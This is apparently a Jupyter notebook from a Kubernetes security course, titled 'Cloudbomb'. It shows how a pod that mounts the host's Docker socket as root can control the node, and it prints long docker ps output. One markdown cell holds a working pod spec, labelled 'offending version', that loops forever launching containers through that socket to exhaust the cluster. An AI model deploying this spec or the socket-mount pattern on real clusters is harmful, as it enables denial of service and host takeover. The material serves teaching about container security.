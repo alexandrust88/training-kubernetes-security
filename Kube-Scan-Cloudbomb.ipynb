{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**This notebook covered by the following [license](License.ipynb)  This note must not be removed**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cloudbomb\n",
    "\n",
    "\n",
    "## Purpose\n",
    "\n",
    "It is shown, how dangerous it is \n",
    "\n",
    "* to start an image from an untrusted source\n",
    "* with __root privileges__\n",
    "* and __access to the host file system__\n",
    "\n",
    "This examples destroys the cluster step by step. \n",
    "\n",
    "It is a dangerous example, turned _s l o w_ for didactic purposes.\n",
    "\n",
    "It can even be made more disruptive easily.\n",
    "\n",
    "Don't put images like this into public registries.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Create an empty directory and change into"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "mkdir -p cloudbomb\n",
    "cd cloudbomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/minikube-host/notebooks/training-kubernetes-security/cloudbomb\n"
     ]
    }
   ],
   "source": [
    "pwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Get Docker\n",
    "\n",
    "See the latest statically linked versions here\n",
    "https://download.docker.com/linux/static/stable/x86_64/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100 60.7M  100 60.7M    0     0  21.8M      0  0:00:02  0:00:02 --:--:-- 21.8M\n"
     ]
    }
   ],
   "source": [
    "curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.8.tgz -o docker.tgz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "docker/\n",
      "docker/containerd\n",
      "docker/docker\n",
      "docker/ctr\n",
      "docker/dockerd\n",
      "docker/runc\n",
      "docker/docker-proxy\n",
      "docker/docker-init\n",
      "docker/containerd-shim\n"
     ]
    }
   ],
   "source": [
    "tar tzf docker.tgz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/minikube-host/training/notebooks/cloudbomb\n"
     ]
    }
   ],
   "source": [
    "pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "tar xzf docker.tgz"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create the Dockerfile\n",
    "\n",
    "and build the image **inside minikube**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FROM alpine\n",
      "\n",
      "COPY docker/docker /usr/bin\n",
      "\n",
      "CMD [\"docker\", \"ps\"]\n"
     ]
    }
   ],
   "source": [
    "cat > Dockerfile <<EOF\n",
    "FROM alpine\n",
    "\n",
    "COPY docker/docker /usr/bin\n",
    "\n",
    "CMD [\"docker\", \"ps\"]\n",
    "EOF\n",
    "cat Dockerfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "REPOSITORY                                TAG        IMAGE ID       CREATED         SIZE\n",
      "nginx                                     latest     f6d0b4767a6c   2 weeks ago     133MB\n",
      "nginxinc/nginx-unprivileged               latest     b34dace3569f   5 weeks ago     133MB\n",
      "kubernetesui/dashboard                    v2.1.0     9a07b5b4bfac   6 weeks ago     226MB\n",
      "k8s.gcr.io/kube-proxy                     v1.20.0    10cc881966cf   6 weeks ago     118MB\n",
      "k8s.gcr.io/kube-scheduler                 v1.20.0    3138b6e3d471   6 weeks ago     46.4MB\n",
      "k8s.gcr.io/kube-controller-manager        v1.20.0    b9fa1895dcaa   6 weeks ago     116MB\n",
      "k8s.gcr.io/kube-apiserver                 v1.20.0    ca9843d3b545   6 weeks ago     122MB\n",
      "gcr.io/k8s-minikube/storage-provisioner   v4         85069258b98a   7 weeks ago     29.7MB\n",
      "k8s.gcr.io/etcd                           3.4.13-0   0369cf4303ff   5 months ago    253MB\n",
      "k8s.gcr.io/coredns                        1.7.0      bfe3a36ebd25   7 months ago    45.2MB\n",
      "kubernetesui/metrics-scraper              v1.0.4     86262685d9ab   10 months ago   36.9MB\n",
      "k8s.gcr.io/pause                          3.2        80d28bedfe5d   11 months ago   683kB\n"
     ]
    }
   ],
   "source": [
    "docker images"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending build context to Docker daemon  274.7MB\n",
      "Step 1/3 : FROM alpine\n",
      "latest: Pulling from library/alpine\n",
      "\n",
      "\u001b[1BDigest: sha256:69e70a79f2d41ab5d637de98c1e0b055206ba40a8145e7bddb55ccc04e13cf8f\n",
      "Status: Downloaded newer image for alpine:latest\n",
      " ---> 6dbb9cc54074\n",
      "Step 2/3 : COPY docker/docker /usr/bin\n",
      " ---> 657ae76b201e\n",
      "Step 3/3 : CMD [\"docker\", \"ps\"]\n",
      " ---> Running in 94a1872f3773\n",
      "Removing intermediate container 94a1872f3773\n",
      " ---> 7392e6e1931e\n",
      "Successfully built 7392e6e1931e\n",
      "Successfully tagged cloudbomb:latest\n"
     ]
    }
   ],
   "source": [
    "docker build . -t cloudbomb"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Check the images\n",
    "\n",
    "`grep -E ... ` is only for colouring "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "REPOSITORY                                TAG        IMAGE ID       CREATED         SIZE\n",
      "\u001b[01;31m\u001b[Kcloudbomb                                 latest     7392e6e1931e   6 seconds ago   71.4MB\u001b[m\u001b[K\n",
      "nginxinc/nginx-unprivileged               latest     37c71e98f25c   13 days ago     133MB\n",
      "alpine                                    latest     6dbb9cc54074   13 days ago     5.61MB\n",
      "nginx                                     latest     62d49f9bab67   2 weeks ago     133MB\n",
      "gcr.io/k8s-minikube/storage-provisioner   v5         6e38f40d628d   4 weeks ago     31.5MB\n",
      "k8s.gcr.io/kube-proxy                     v1.20.2    43154ddb57a8   3 months ago    118MB\n",
      "k8s.gcr.io/kube-apiserver                 v1.20.2    a8c2fdb8bf76   3 months ago    122MB\n",
      "k8s.gcr.io/kube-controller-manager        v1.20.2    a27166429d98   3 months ago    116MB\n",
      "k8s.gcr.io/kube-scheduler                 v1.20.2    ed2c44fbdd78   3 months ago    46.4MB\n",
      "kubernetesui/dashboard                    v2.1.0     9a07b5b4bfac   4 months ago    226MB\n",
      "k8s.gcr.io/etcd                           3.4.13-0   0369cf4303ff   8 months ago    253MB\n",
      "k8s.gcr.io/coredns                        1.7.0      bfe3a36ebd25   10 months ago   45.2MB\n",
      "kubernetesui/metrics-scraper              v1.0.4     86262685d9ab   13 months ago   36.9MB\n",
      "k8s.gcr.io/pause                          3.2        80d28bedfe5d   14 months ago   683kB\n"
     ]
    }
   ],
   "source": [
    "docker images | grep --color=always -E '$|cloudbomb.*$' "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Create the Cloudbomb Pod\n",
    "\n",
    "* it is mounting the Docker socket `/var/run/docker.sock` into the container, we have `hostPath` rights\n",
    "* the `docker` process is running as `root`\n",
    "* **Gotcha**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Offending version, don't use\n",
    "\n",
    "```yaml\n",
    "apiVersion: v1\n",
    "kind: Pod\n",
    "metadata:\n",
    "  name: cloudbomb \n",
    "spec:\n",
    "  containers:\n",
    "  - image: cloudbomb\n",
    "    imagePullPolicy: IfNotPresent\n",
    "    command:\n",
    "      - /bin/sh\n",
    "      - \"-c\" \n",
    "      - \"while true; \\\n",
    "           do \\   \n",
    "             docker run -d --name BOOM_\\$(cat /dev/urandom | \\\n",
    "             tr -cd 'a-f0-9' | \\\n",
    "             head -c 6) nginx ; \\\n",
    "             sleep 10 ; \\\n",
    "           done\"\n",
    "    name: cloudbomb\n",
    "    volumeMounts:\n",
    "    - mountPath: /var/run/docker.sock\n",
    "      name: docker-socket\n",
    "  volumes:\n",
    "  - name: docker-socket\n",
    "    hostPath:\n",
    "      path: /var/run/docker.sock\n",
    "      type: Socket\n",
    "```\n",
    "\n",
    "# Soft version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pod/cloudbomb created\n"
     ]
    }
   ],
   "source": [
    "kubectl create -f - <<EOF\n",
    "apiVersion: v1\n",
    "kind: Pod\n",
    "metadata:\n",
    "  name: cloudbomb \n",
    "spec:\n",
    "  containers:\n",
    "  - image: cloudbomb\n",
    "    imagePullPolicy: IfNotPresent\n",
    "    command:\n",
    "      - /bin/sh\n",
    "      - \"-c\" \n",
    "      - \"while true; \\\n",
    "           do \\   \n",
    "             docker ps ; \\\n",
    "             sleep 10 ; \\\n",
    "           done\"\n",
    "    name: cloudbomb\n",
    "    volumeMounts:\n",
    "    - mountPath: /var/run/docker.sock\n",
    "      name: docker-socket\n",
    "  volumes:\n",
    "  - name: docker-socket\n",
    "    hostPath:\n",
    "      path: /var/run/docker.sock\n",
    "      type: Socket\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                                      READY   STATUS    RESTARTS   AGE\n",
      "cloudbomb                                 1/1     Running   0          3s\n",
      "nginx-strict-5cdc48cf55-27r9c             1/1     Running   0          23m\n",
      "nginx-strict-5cdc48cf55-k65vn             1/1     Running   0          23m\n",
      "nginx-strict-5cdc48cf55-rwkt5             1/1     Running   0          23m\n",
      "nginx-with-token-again-66868cff8b-dncj2   1/1     Running   0          20m\n"
     ]
    }
   ],
   "source": [
    "kubectl get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pod/cloudbomb condition met\n"
     ]
    }
   ],
   "source": [
    "kubectl wait --for=condition=ready --timeout=10s pod/cloudbomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                            READY   STATUS    RESTARTS   AGE\n",
      "cloudbomb                       1/1     Running   0          6s\n",
      "nginx-strict-5cdc48cf55-f5r5l   1/1     Running   0          3h45m\n",
      "nginx-strict-5cdc48cf55-v72v5   1/1     Running   0          3h45m\n",
      "nginx-strict-5cdc48cf55-xkh98   1/1     Running   0          3h45m\n"
     ]
    }
   ],
   "source": [
    "kubectl get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS                  PORTS               NAMES\n",
      "fdd5d0665eff        7392e6e1931e                  \"/bin/sh -c 'while t…\"   1 second ago        Up Less than a second                       k8s_cloudbomb_cloudbomb_default_946f8797-7aff-420e-bd18-6d423f0355f2_0\n",
      "a929932d188b        k8s.gcr.io/pause:3.2          \"/pause\"                 1 second ago        Up Less than a second                       k8s_POD_cloudbomb_default_946f8797-7aff-420e-bd18-6d423f0355f2_0\n",
      "86d32a9339ca        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   20 minutes ago      Up 20 minutes                               k8s_nginx_nginx-with-token-again-66868cff8b-dncj2_default_f05b0558-0f28-4308-ae01-2279d0613cec_0\n",
      "78b44b6cb884        k8s.gcr.io/pause:3.2          \"/pause\"                 20 minutes ago      Up 20 minutes                               k8s_POD_nginx-with-token-again-66868cff8b-dncj2_default_f05b0558-0f28-4308-ae01-2279d0613cec_0\n",
      "1060b62d641f        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   23 minutes ago      Up 23 minutes                               k8s_nginx_nginx-strict-5cdc48cf55-27r9c_default_1e877989-8b72-4bbe-a670-e12bd82b4454_0\n",
      "13003a74d415        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   23 minutes ago      Up 23 minutes                               k8s_nginx_nginx-strict-5cdc48cf55-rwkt5_default_564e5dff-f299-4c6c-b257-1f301946fd0f_0\n",
      "294f4198b3c8        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   23 minutes ago      Up 23 minutes                               k8s_nginx_nginx-strict-5cdc48cf55-k65vn_default_3cb46d4a-0aa0-42e5-8b62-fafd33baf99d_0\n",
      "d3d711a5e837        k8s.gcr.io/pause:3.2          \"/pause\"                 23 minutes ago      Up 23 minutes                               k8s_POD_nginx-strict-5cdc48cf55-27r9c_default_1e877989-8b72-4bbe-a670-e12bd82b4454_0\n",
      "b88a97a63927        k8s.gcr.io/pause:3.2          \"/pause\"                 23 minutes ago      Up 23 minutes                               k8s_POD_nginx-strict-5cdc48cf55-k65vn_default_3cb46d4a-0aa0-42e5-8b62-fafd33baf99d_0\n",
      "f9c041c4ac17        k8s.gcr.io/pause:3.2          \"/pause\"                 23 minutes ago      Up 23 minutes                               k8s_POD_nginx-strict-5cdc48cf55-rwkt5_default_564e5dff-f299-4c6c-b257-1f301946fd0f_0\n",
      "012ab7232469        86262685d9ab                  \"/metrics-sidecar\"       5 hours ago         Up 5 hours                                  k8s_dashboard-metrics-scraper_dashboard-metrics-scraper-f6647bd8c-cst2g_kubernetes-dashboard_609139cd-a00f-444a-927a-cb60657ef7d2_0\n",
      "a916f22652df        9a07b5b4bfac                  \"/dashboard --insecu…\"   5 hours ago         Up 5 hours                                  k8s_kubernetes-dashboard_kubernetes-dashboard-968bcb79-zzwcl_kubernetes-dashboard_ea46ab81-d0df-4bcd-9e23-f8a998ca2cc9_0\n",
      "14d3c766e0d6        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                                  k8s_POD_dashboard-metrics-scraper-f6647bd8c-cst2g_kubernetes-dashboard_609139cd-a00f-444a-927a-cb60657ef7d2_0\n",
      "b70831264217        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                                  k8s_POD_kubernetes-dashboard-968bcb79-zzwcl_kubernetes-dashboard_ea46ab81-d0df-4bcd-9e23-f8a998ca2cc9_0\n",
      "4c0e8dcb5547        6e38f40d628d                  \"/storage-provisioner\"   5 hours ago         Up 5 hours                                  k8s_storage-provisioner_storage-provisioner_kube-system_97fe1ddc-35ad-4638-b760-7cb08821a666_3\n",
      "aba5061e5eeb        bfe3a36ebd25                  \"/coredns -conf /etc…\"   5 hours ago         Up 5 hours                                  k8s_coredns_coredns-74ff55c5b-hq2hm_kube-system_9cb80d6a-75ce-485f-86c0-1ef32976f9d2_1\n",
      "c166b2b1d286        43154ddb57a8                  \"/usr/local/bin/kube…\"   5 hours ago         Up 5 hours                                  k8s_kube-proxy_kube-proxy-lv5cn_kube-system_1ee8105a-fb26-4137-abc1-1cfade341989_1\n",
      "4c7bd98aedb5        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                                  k8s_POD_kube-proxy-lv5cn_kube-system_1ee8105a-fb26-4137-abc1-1cfade341989_1\n",
      "ae598137a8a1        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                                  k8s_POD_storage-provisioner_kube-system_97fe1ddc-35ad-4638-b760-7cb08821a666_1\n",
      "8a779a41ef4b        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                                  k8s_POD_coredns-74ff55c5b-hq2hm_kube-system_9cb80d6a-75ce-485f-86c0-1ef32976f9d2_1\n",
      "4688e1bd1c7a        ed2c44fbdd78                  \"kube-scheduler --au…\"   5 hours ago         Up 5 hours                                  k8s_kube-scheduler_kube-scheduler-minikube_kube-system_6b4a0ee8b3d15a1c2e47c15d32e6eb0d_1\n",
      "7b297c602e69        0369cf4303ff                  \"etcd --advertise-cl…\"   5 hours ago         Up 5 hours                                  k8s_etcd_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_1\n",
      "e8cad49baae8        a27166429d98                  \"kube-controller-man…\"   5 hours ago         Up 5 hours                                  k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_57b8c22dbe6410e4bd36cf14b0f8bdc7_1\n",
      "3cc1b2a464b2        a8c2fdb8bf76                  \"kube-apiserver --ad…\"   5 hours ago         Up 5 hours                                  k8s_kube-apiserver_kube-apiserver-minikube_kube-system_c767dbeb9ddd2d01964c2fc02c621c4e_1\n",
      "436149371cdc        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                                  k8s_POD_kube-scheduler-minikube_kube-system_6b4a0ee8b3d15a1c2e47c15d32e6eb0d_1\n",
      "9d4795779b94        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                                  k8s_POD_kube-controller-manager-minikube_kube-system_57b8c22dbe6410e4bd36cf14b0f8bdc7_1\n",
      "62f795b1ec54        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                                  k8s_POD_kube-apiserver-minikube_kube-system_c767dbeb9ddd2d01964c2fc02c621c4e_1\n",
      "8beeb5fea3f8        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                                  k8s_POD_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_1\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "fdd5d0665eff        7392e6e1931e                  \"/bin/sh -c 'while t…\"   11 seconds ago      Up 10 seconds                           k8s_cloudbomb_cloudbomb_default_946f8797-7aff-420e-bd18-6d423f0355f2_0\n",
      "a929932d188b        k8s.gcr.io/pause:3.2          \"/pause\"                 11 seconds ago      Up 10 seconds                           k8s_POD_cloudbomb_default_946f8797-7aff-420e-bd18-6d423f0355f2_0\n",
      "86d32a9339ca        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   20 minutes ago      Up 20 minutes                           k8s_nginx_nginx-with-token-again-66868cff8b-dncj2_default_f05b0558-0f28-4308-ae01-2279d0613cec_0\n",
      "78b44b6cb884        k8s.gcr.io/pause:3.2          \"/pause\"                 20 minutes ago      Up 20 minutes                           k8s_POD_nginx-with-token-again-66868cff8b-dncj2_default_f05b0558-0f28-4308-ae01-2279d0613cec_0\n",
      "1060b62d641f        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   24 minutes ago      Up 23 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-27r9c_default_1e877989-8b72-4bbe-a670-e12bd82b4454_0\n",
      "13003a74d415        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   24 minutes ago      Up 24 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-rwkt5_default_564e5dff-f299-4c6c-b257-1f301946fd0f_0\n",
      "294f4198b3c8        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   24 minutes ago      Up 24 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-k65vn_default_3cb46d4a-0aa0-42e5-8b62-fafd33baf99d_0\n",
      "d3d711a5e837        k8s.gcr.io/pause:3.2          \"/pause\"                 24 minutes ago      Up 24 minutes                           k8s_POD_nginx-strict-5cdc48cf55-27r9c_default_1e877989-8b72-4bbe-a670-e12bd82b4454_0\n",
      "b88a97a63927        k8s.gcr.io/pause:3.2          \"/pause\"                 24 minutes ago      Up 24 minutes                           k8s_POD_nginx-strict-5cdc48cf55-k65vn_default_3cb46d4a-0aa0-42e5-8b62-fafd33baf99d_0\n",
      "f9c041c4ac17        k8s.gcr.io/pause:3.2          \"/pause\"                 24 minutes ago      Up 24 minutes                           k8s_POD_nginx-strict-5cdc48cf55-rwkt5_default_564e5dff-f299-4c6c-b257-1f301946fd0f_0\n",
      "012ab7232469        86262685d9ab                  \"/metrics-sidecar\"       5 hours ago         Up 5 hours                              k8s_dashboard-metrics-scraper_dashboard-metrics-scraper-f6647bd8c-cst2g_kubernetes-dashboard_609139cd-a00f-444a-927a-cb60657ef7d2_0\n",
      "a916f22652df        9a07b5b4bfac                  \"/dashboard --insecu…\"   5 hours ago         Up 5 hours                              k8s_kubernetes-dashboard_kubernetes-dashboard-968bcb79-zzwcl_kubernetes-dashboard_ea46ab81-d0df-4bcd-9e23-f8a998ca2cc9_0\n",
      "14d3c766e0d6        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_dashboard-metrics-scraper-f6647bd8c-cst2g_kubernetes-dashboard_609139cd-a00f-444a-927a-cb60657ef7d2_0\n",
      "b70831264217        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kubernetes-dashboard-968bcb79-zzwcl_kubernetes-dashboard_ea46ab81-d0df-4bcd-9e23-f8a998ca2cc9_0\n",
      "4c0e8dcb5547        6e38f40d628d                  \"/storage-provisioner\"   5 hours ago         Up 5 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_97fe1ddc-35ad-4638-b760-7cb08821a666_3\n",
      "aba5061e5eeb        bfe3a36ebd25                  \"/coredns -conf /etc…\"   5 hours ago         Up 5 hours                              k8s_coredns_coredns-74ff55c5b-hq2hm_kube-system_9cb80d6a-75ce-485f-86c0-1ef32976f9d2_1\n",
      "c166b2b1d286        43154ddb57a8                  \"/usr/local/bin/kube…\"   5 hours ago         Up 5 hours                              k8s_kube-proxy_kube-proxy-lv5cn_kube-system_1ee8105a-fb26-4137-abc1-1cfade341989_1\n",
      "4c7bd98aedb5        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kube-proxy-lv5cn_kube-system_1ee8105a-fb26-4137-abc1-1cfade341989_1\n",
      "ae598137a8a1        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_storage-provisioner_kube-system_97fe1ddc-35ad-4638-b760-7cb08821a666_1\n",
      "8a779a41ef4b        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_coredns-74ff55c5b-hq2hm_kube-system_9cb80d6a-75ce-485f-86c0-1ef32976f9d2_1\n",
      "4688e1bd1c7a        ed2c44fbdd78                  \"kube-scheduler --au…\"   5 hours ago         Up 5 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_6b4a0ee8b3d15a1c2e47c15d32e6eb0d_1\n",
      "7b297c602e69        0369cf4303ff                  \"etcd --advertise-cl…\"   5 hours ago         Up 5 hours                              k8s_etcd_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_1\n",
      "e8cad49baae8        a27166429d98                  \"kube-controller-man…\"   5 hours ago         Up 5 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_57b8c22dbe6410e4bd36cf14b0f8bdc7_1\n",
      "3cc1b2a464b2        a8c2fdb8bf76                  \"kube-apiserver --ad…\"   5 hours ago         Up 5 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_c767dbeb9ddd2d01964c2fc02c621c4e_1\n",
      "436149371cdc        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kube-scheduler-minikube_kube-system_6b4a0ee8b3d15a1c2e47c15d32e6eb0d_1\n",
      "9d4795779b94        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_57b8c22dbe6410e4bd36cf14b0f8bdc7_1\n",
      "62f795b1ec54        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kube-apiserver-minikube_kube-system_c767dbeb9ddd2d01964c2fc02c621c4e_1\n",
      "8beeb5fea3f8        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_1\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "fdd5d0665eff        7392e6e1931e                  \"/bin/sh -c 'while t…\"   21 seconds ago      Up 20 seconds                           k8s_cloudbomb_cloudbomb_default_946f8797-7aff-420e-bd18-6d423f0355f2_0\n",
      "a929932d188b        k8s.gcr.io/pause:3.2          \"/pause\"                 21 seconds ago      Up 20 seconds                           k8s_POD_cloudbomb_default_946f8797-7aff-420e-bd18-6d423f0355f2_0\n",
      "86d32a9339ca        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   20 minutes ago      Up 20 minutes                           k8s_nginx_nginx-with-token-again-66868cff8b-dncj2_default_f05b0558-0f28-4308-ae01-2279d0613cec_0\n",
      "78b44b6cb884        k8s.gcr.io/pause:3.2          \"/pause\"                 20 minutes ago      Up 20 minutes                           k8s_POD_nginx-with-token-again-66868cff8b-dncj2_default_f05b0558-0f28-4308-ae01-2279d0613cec_0\n",
      "1060b62d641f        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   24 minutes ago      Up 24 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-27r9c_default_1e877989-8b72-4bbe-a670-e12bd82b4454_0\n",
      "13003a74d415        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   24 minutes ago      Up 24 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-rwkt5_default_564e5dff-f299-4c6c-b257-1f301946fd0f_0\n",
      "294f4198b3c8        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   24 minutes ago      Up 24 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-k65vn_default_3cb46d4a-0aa0-42e5-8b62-fafd33baf99d_0\n",
      "d3d711a5e837        k8s.gcr.io/pause:3.2          \"/pause\"                 24 minutes ago      Up 24 minutes                           k8s_POD_nginx-strict-5cdc48cf55-27r9c_default_1e877989-8b72-4bbe-a670-e12bd82b4454_0\n",
      "b88a97a63927        k8s.gcr.io/pause:3.2          \"/pause\"                 24 minutes ago      Up 24 minutes                           k8s_POD_nginx-strict-5cdc48cf55-k65vn_default_3cb46d4a-0aa0-42e5-8b62-fafd33baf99d_0\n",
      "f9c041c4ac17        k8s.gcr.io/pause:3.2          \"/pause\"                 24 minutes ago      Up 24 minutes                           k8s_POD_nginx-strict-5cdc48cf55-rwkt5_default_564e5dff-f299-4c6c-b257-1f301946fd0f_0\n",
      "012ab7232469        86262685d9ab                  \"/metrics-sidecar\"       5 hours ago         Up 5 hours                              k8s_dashboard-metrics-scraper_dashboard-metrics-scraper-f6647bd8c-cst2g_kubernetes-dashboard_609139cd-a00f-444a-927a-cb60657ef7d2_0\n",
      "a916f22652df        9a07b5b4bfac                  \"/dashboard --insecu…\"   5 hours ago         Up 5 hours                              k8s_kubernetes-dashboard_kubernetes-dashboard-968bcb79-zzwcl_kubernetes-dashboard_ea46ab81-d0df-4bcd-9e23-f8a998ca2cc9_0\n",
      "14d3c766e0d6        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_dashboard-metrics-scraper-f6647bd8c-cst2g_kubernetes-dashboard_609139cd-a00f-444a-927a-cb60657ef7d2_0\n",
      "b70831264217        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kubernetes-dashboard-968bcb79-zzwcl_kubernetes-dashboard_ea46ab81-d0df-4bcd-9e23-f8a998ca2cc9_0\n",
      "4c0e8dcb5547        6e38f40d628d                  \"/storage-provisioner\"   5 hours ago         Up 5 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_97fe1ddc-35ad-4638-b760-7cb08821a666_3\n",
      "aba5061e5eeb        bfe3a36ebd25                  \"/coredns -conf /etc…\"   5 hours ago         Up 5 hours                              k8s_coredns_coredns-74ff55c5b-hq2hm_kube-system_9cb80d6a-75ce-485f-86c0-1ef32976f9d2_1\n",
      "c166b2b1d286        43154ddb57a8                  \"/usr/local/bin/kube…\"   5 hours ago         Up 5 hours                              k8s_kube-proxy_kube-proxy-lv5cn_kube-system_1ee8105a-fb26-4137-abc1-1cfade341989_1\n",
      "4c7bd98aedb5        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kube-proxy-lv5cn_kube-system_1ee8105a-fb26-4137-abc1-1cfade341989_1\n",
      "ae598137a8a1        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_storage-provisioner_kube-system_97fe1ddc-35ad-4638-b760-7cb08821a666_1\n",
      "8a779a41ef4b        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_coredns-74ff55c5b-hq2hm_kube-system_9cb80d6a-75ce-485f-86c0-1ef32976f9d2_1\n",
      "4688e1bd1c7a        ed2c44fbdd78                  \"kube-scheduler --au…\"   5 hours ago         Up 5 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_6b4a0ee8b3d15a1c2e47c15d32e6eb0d_1\n",
